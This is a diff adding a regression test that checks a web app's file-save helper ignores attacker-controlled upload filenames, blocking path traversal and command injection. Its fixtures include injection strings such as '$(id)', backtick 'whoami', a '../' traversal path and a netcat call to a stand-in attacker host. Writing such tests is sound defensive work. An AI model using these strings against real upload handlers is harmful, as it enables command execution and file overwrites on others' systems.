@@ -52,6 +52,35 @@ def test_save_file_writes_and_returns_path(app):
             os.remove(path)
 
 
+def test_save_file_ignores_attacker_controlled_filename(app):
+    """The uploaded filename is fully attacker-controlled and must never reach
+    the on-disk name: shell metacharacters and path separators are dropped in
+    favor of a random ``<hex>.txt`` name, and the write stays inside the target
+    directory (no path-traversal write). Guards CWE-22/CWE-78 (GHSA report)."""
+    import re
+
+    class _EvilFile:
+        def __init__(self, filename):
+            self.filename = filename
+
+        def save(self, dst):
+            with open(dst, "wb") as fh:
+                fh.write(b"payload")
+
+    control_tmp = os.path.realpath(os.path.join(app.root_path, "control", "tmp"))
+    for evil in ["$(id)/x.txt", "../../../../tmp/evil/y.txt", "a;touch pwned;.txt",
+                 "`whoami`/z", "|nc attacker 1234/x"]:
+        path = u.save_file("control/tmp", _EvilFile(evil))
+        try:
+            base = os.path.basename(path)
+            assert re.fullmatch(r"[0-9a-f]{16}\.txt", base), base
+            assert os.path.realpath(path).startswith(control_tmp + os.sep)
+            assert os.path.exists(path)
+        finally:
+            if os.path.exists(path):
+                os.remove(path)
+
+
 # --- email helpers ----------------------------------------------------------
 
 def test_send_email_uses_mail_extension(app):
